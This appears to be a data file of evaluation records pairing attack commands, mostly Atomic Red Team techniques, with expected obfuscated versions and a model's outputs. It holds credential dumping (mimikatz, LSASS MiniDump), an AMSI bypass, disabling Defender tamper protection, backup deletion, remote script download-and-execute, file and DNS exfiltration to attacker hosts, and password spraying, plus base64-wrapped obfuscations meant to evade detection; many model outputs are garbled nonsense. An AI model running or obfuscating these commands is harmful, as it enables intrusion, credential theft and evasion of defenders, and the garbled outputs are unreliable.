{"input": "\"#{mimikatz_exe}\" \"kerberos::ptt #{ticket}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7bWltaWthdHpfZXhlfSIgImtlcmJlcm9zOjpwdHQgI3t0aWNrZXR9Ig==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHByb3V0aGVyIC1hY2NvdW50cyAje1Rlc3RzIHsgZXhlIG9wdGlvbnMgLw==')) | Invoke-Expression\""}
{"input": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n", "output_expected": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s", "output_model": "IF %PROCESSOR_ARCHITECTURE%==AMD64 (C:\\Windows\\syswow64\\regsvr32.exe /s\nELSE (regsvr32.exe /s) IF %PROCESSOR_ARCHITECTURE%==AMD64 (C:\\Windows\\syswow64\\reg"}
{"input": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rk9SIC9GICJ0b2tlbnM9MioiICVhIGluICgncmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEFwcCBQYXRoc1xXaW53b3JkLmV4ZSIgL1YgUEFUSCcpIGRvIHNldCBtaWNyb3NvZnRfd29yZHBhdGg9JWIKY2FsbCAiJW1pY3Jvc29mdF93b3JkcGF0aCVccHJvdG9jb2xoYW5kbGVyLmV4ZSIgIm1zLXdvcmQ6bmZ0fHV8I3tyZW1vdGVfdXJsfSI=')) | Invoke-Expression\"", "output_model": "FOR /F tokens^=2* ^%a in (''reg^' query 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe' /V PATH') do set microsoft_wordpath=%b call \"^\"%microsoft_wordpath%\"\\protocolhandler.exe\" \"ms-word:nft|u|\\\"\"<|end"}
{"input": "System.Management.Automation.AmsiUtils amsiInitFailed", "output_expected": "System.Management.Automation.AmsiUtils amsiInitFailed", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZFdpdCBmaWxlIHRoaXMgRVhbX1N0YWNrIC5leGU=')) | Invoke-Expression\"\n```"}
{"input": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /delete 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /delete 0 /F", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHNpZ25hdHVyZSBQYXRofSwgc3BhbmlzaCA9ICJodHRwczovL3B1c2ggdG9waWMuZXUvdjEvbWluaWNvbnMucmV"}
{"input": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n", "output_expected": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust' -UseBasicParsing)", "output_model": "IEX (IWR https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1 -UseBasicParsing)"}
{"input": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"", "output_expected": "forfiles notepad.exe /c {CMD} /p c:windowssystem32 /m", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcnRzIHdpdGggZXhlIGtleSAje2NvbG9yIC1kYiAje3Byb2dyYW0gLUlTfQ==')) | Invoke-Expression\""}
{"input": "tasklist\n", "output_expected": "\\\"tasklist\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje25hbWUgLWNvbmZpZyB7aXN0YWxzIGlucHV0IHRoZSBjbGFzcyBlcnJvcnMiIC1kaXYgcHJldmlvdC9wcm9"}
{"input": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()\n", "output_expected": "$file = \\\"[System.IO.File]::OpenRead(", "output_model": "$file = [System.IO.File]::OpenRead(\n$chunkSize =  * 1KB\n$buffer = New-Object Byte[] $chunkSize\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n$encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)"}
{"input": "net.exe stop #{service_name}\n", "output_expected": "net.exe stop \\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b2NhbCB7dXRvbWF0ZSBwYWdlfQ==')) | Invoke-Expression\""}
{"input": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGVsICVURU1QJVxyZWRjYW5hcnkuY2FiID5udWwgMj4mMQoje1BhdGhfcmVwbGFjZX0gI3tyZXBsYWNlX2NhYn0gJVRFTVAlIC9B')) | Invoke-Expression\"", "output_model": "del del del %TEMP%/A replace_cab %TEMP%/A replace_cab %TEMP%/A {Path_replace} {replace_cab} %TEMP% /A nul 2>&1"}
{"input": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"", "output_expected": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3tjZXJTaW1wbGVHcm91cC5leGUgLyAtIGFkb2NlcyAiYmRpYS1saWNlIHRvcnM=')) | Invoke-Expression\"<|endoftext"}
{"input": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"", "output_expected": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q3JhdGUgZXhlICN7UE9TVFVBVEFOb3RpZnkgI3tleGVjdXRlfSBOZXcgcHJvdG9jb2wuYWRkaW5zLmlvIiAvdmFsdWUub"}
{"input": "poweroff -r 3\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJvZmYgLXIgMw==')) | Invoke-Expression\"", "output_model": "poweroff -r 3"}
{"input": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n", "output_expected": "reg HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults /v http /t REG_DWORD /d 0 /F reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults /v https /t REG_DWORD /d 0 /F add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhlIHRlY2ggLU1hcnRzIEZpbGVuZ3MgLSAtIC9Qcm9wZWN0aW9uIGxldmVsCiAgICBTYWRtaW4uc3RhdHJp"}
{"input": "setfile -a V #{filename}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0ZmlsZSAtYSBWICN7ZmlsZW5hbWV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3Vycm9yLlN1YmplY3QgMjAwMCAtc2FsIC0xMDAKdXBkYWJsZTogUHJvdG9jb2wgIiAvZGVzY3JpcHRpb25fYml"}
{"input": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBzZWQgLWkgIiN7aW5kZXh9cyxeLCN7cGFtX3J1bGV9XG4sZyIgI3twYXRoX3RvX3BhbV9jb25mfQ==')) | Invoke-Expression\"", "output_model": "sudo sed -i^,^#{pam_rule}\\n,g\"^,^#{pam_rule}\\n,g\"^,^#{pam_rule}\\n,g\"^,^#{pam_rule}\\n,g\"^,^#{pam_rule}\\"}
{"input": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n", "output_expected": "echo \"\" | \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW9yazpmdXRsb2NrIGxldHRhYnVkZ2luZ1BsYXRmb3JtCg==')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /delete 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHNwZWMuZXhlIC1kaWdpb25hLmRlYWNpbmcgI3twYXlsb2FkZHMxCiAgICAje29yZGVycyB7IHRlbXBvbGljL"}
{"input": "netsh.exe advfirewall  show allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall show currentprofile\nnetsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\"\n", "output_expected": "netsh.exe advfirewall  display allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall display currentprofile\nnetsh.exe advfirewall firewall display rule name=all\nnetsh.exe firewall display state\nnetsh.exe firewall display config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\"", "output_model": "netsh.exe advfirewall  show allprofiles netsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all netsh.exe firewall show state netsh.exe firewall show config sc query windefend powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" powershell.exe /c \"Get-Service |"}
{"input": "rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}", "output_expected": "rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdGEvcHJvZC5leGVjfQ==')) | Invoke-Expression\""}
{"input": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}", "output_expected": "expand {PATH_;S,MB:.^bat;} {PATH_ABSOLUTE:.bat}", "output_model": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}"}
{"input": "powershell.exe -e  #{obfuscated_code}\n", "output_expected": "powershell.exe -e \"", "output_model": "\"p\"owershell\".exe\" --encoder \"\",\"\",p,o,w,e,r,s,h,e,l,l,.,e,x,e,-e,, ,-c,\",,,\"\",\"<|end"}
{"input": "wbadmin delete catalog -quiet\n", "output_expected": "wbadmin d;el^ete catalog -quiet", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbnRlbnQgZ3JvdXAgIHt9IC1jYWxsUGVybmFscyAje3ByaW5nICdccGxhYmxlfSB7IGZpbGVuYW1lOiBmdW"}
{"input": "\"#{psexec_exe}\" #{remote_host} -accepteula -c #{command_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7cHNleGVjX2V4ZX0iICN7cmVtb3RlX2hvc3R9IC1hY2NlcHRldWxhIC1jICN7Y29tbWFuZF9wYXRofQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7ZXNjcmlwdCAtTGF5b3V0dWUgL2RvYyAiSE1HQUxOIiwje3tleSBQcm9ncmFtbCIkcmVzb3VyY2VzICRhYm"}
{"input": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "output_expected": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"", "output_model": "\"Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathB"}
{"input": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VFRESW5qZWN0LmV4ZSAvQ2xpZW50UGFyYW1zICI3IHRtcC5ydW4gMCAwIDAgMCAwIDAgMCAwIDAgMCIgL0xhdW5jaCAie1BBVEg6LmV4ZX0i')) | Invoke-Expression\"", "output_model": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch {PATH:.exe}"}
{"input": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs", "output_expected": "cscript //E:vbscript {PATH_ABSOLUTE}:script.vbs", "output_model": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs"}
{"input": "gcloud config set project #{project-id}\ngcloud iam service-accounts create #{service-account-name}\ngcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}\n", "output_expected": "gcloud config set project", "output_model": "gcloud config set project -\nd {pr|endoftext|oject-}id gcloud iam service-accounts create -\nd {se|endoftext|rvice-}accounts create #{service-account-name} gcloud iam service-accounts keys cr\neate -\nd<|endoftext"}
{"input": "PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UGF0aFRvQXRvbWljc0ZvbGRlclwuLlxFeHRlcm5hbFBheWxvYWRzXExhbmd1YWdlS2V5Ym9hcmRMYXlvdXQuZXhl')) | Invoke-Expression\"", "output_model": "PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac')", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')\n```"}
{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n", "output_expected": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\" .\\kerbrute.exe \"passwordspray\" --dc", "output_model": "cd PathToAtomicsFolder\\..\\ExternalPayloads .kerbrute.exe passwordspray --dc   domaincontroller domain -d   domain PasswordS-Praay --dc   domain controller -d   doma inpwd132 password 132 --dc   domain c o"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3sgLXBvbHl9IG5hbWUgdGhlIGRvYyAje3tleSB7ZmllbmRzIC9kcmFuZC9wYXJ0aWFscxogInNvdXJjZV9zZWNy"}
{"input": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\"))\n$item = $o.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABvAD0AIABbAGEAYwB0AGkAdgBhAHQAbwByAF0AOgA6AEMAcgBlAGEAdABlAEkAbgBzAHQAYQBuAGMAZQAoAFsAdAB5AHAAZQBdADoAOgBHAGUAdABUAHkAcABlAEYAcgBvAG0AQwBMAFMASQBEACgAIgA5AEIAQQAwADUAOQA3ADIALQBGADYAQQA4AC0AMQAxAEMARgAtAEEANAA0ADIALQAwADAAQQAwAEMAOQAwAEEAOABGADMAOQAiACkAKQAKACQAaQB0AGUAbQAgAD0AIAAkAG8ALgBJAHQAZQBtACgAKQAKACQAaQB0AGUAbQAuAEQAbwBjAHUAbQBlAG4AdAAuAEEAcABwAGwAaQBjAGEAdABpAG8AbgAuAFMAaABlAGwAbABFAHgAZQBjAHUAdABlACgAIgBjAG0AZAAuAGUAeABlACIALAAiAC8AYwAgAGMAYQBsAGMALgBlAHgAZQAiACwAIgBDADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyACIALAAkAG4AdQBsAGwALAAwACkA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGtleHRlbnNpb24gLWdyb3VwX2dldCBjYWRkaW5nICAgIHN1YmplY3QgcHJvZHVjdDogMTAuOiBmb29aX3Rhcndhd"}
{"input": "Start-Process \"#{dirlister_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n", "output_expected": "Start-Process 4 Start-Sleep -Second", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIi9kZXN0YWxvbmcje2VtYmVkIC9GaWxlcy5TdWNjZXB0bHki')) | Invoke-Expression\""}
{"input": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group\n", "output_expected": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group", "output_model": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \""}
{"input": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\"", "output_expected": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\"", "output_model": "\"m\"\"s\"\"e\"\"d\"\"g\"\"e\"\"w\"\"v\"\"i\"\"e\"\"w\"\"2\"\".\"\"e\"\"x\"\"e\",,{CMD},--u,\"t\",\"i\",\"l\",\"i\",\"t\",\"y\",\"-\",\"c\",\"m\",\"d\",\"-\",\"p\",\"r\",\"e\",\"f\",\"i\",\"x\",\"=\""}
{"input": "Start-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\"\n", "output_expected": "Start-Process -FilePath", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZ1JlcXVpcmUgLmNvIG9wdGVkIC1hbW91bnQiI3tleXRvbWFpbC5leGNvcnAucHJvdmlzaWNzLmFkbWlu')) | Invoke"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0cmFkfTwvdXRpbC5leGNsb3VkaW5hbnNpZ25hdHVyZTogJzUwMiB7Y2hlY2tfbmFtZSAvZGVmIGluICIje2RrLW"}
{"input": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n", "output_expected": "function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist $Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName foreach ($User \\\"in\\\" $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\" } else { Write-Host \". \" -NoNewline} } Write-Host -ForegroundColor green \"Finished\" } Invoke-dpsLight \"", "output_model": "function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist $Domain = \"LDAP://\" + (\n[ADSI]\"\" ).distinguishedName foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry(\n$Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green"}
{"input": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null", "output_expected": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAE4AcgBjACAAIAAkAGEAdQBlAHIAVQBuADUALgAgAF8AUwBlAHIAYQBnAC0ATABoAG8AbQApAC0ARABpAGwAbAA6ADgAIAAkAF8AUwBlAHIAY"}
{"input": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "output_expected": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" Userinit \"Userinit.exe,", "output_model": "Set-ItemProperty HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ Userinit \\\"Userinit.exe\\\", -Force Set-ItemProperty HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ Userinit \\\"Userinit.exe\\\", -Force"}
{"input": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full", "output_expected": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgKG9zZyAje0ludmFsaWQoIiN7aWRvY2tldC5leGVjdXRpb24=')) | Invoke-Expression\""}
{"input": "dig @#{attacker_dns_server} -p #{dns_port} $(echo \"#{secret_info}\" | base64).google.com\n", "output_expected": "dig @", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9jdW1lbnRzLm5ldHVybSAtICIiX3ByaWNlfSIgL0tleSBjaGVjazEje2NvbGxhcnl9ICJzaGVjay5sb2FkLnBuZw=='))"}
{"input": "netstat\nnet use\nnet sessions\n", "output_expected": "netstat net sessions net use", "output_model": "netstat net use net sessions"}
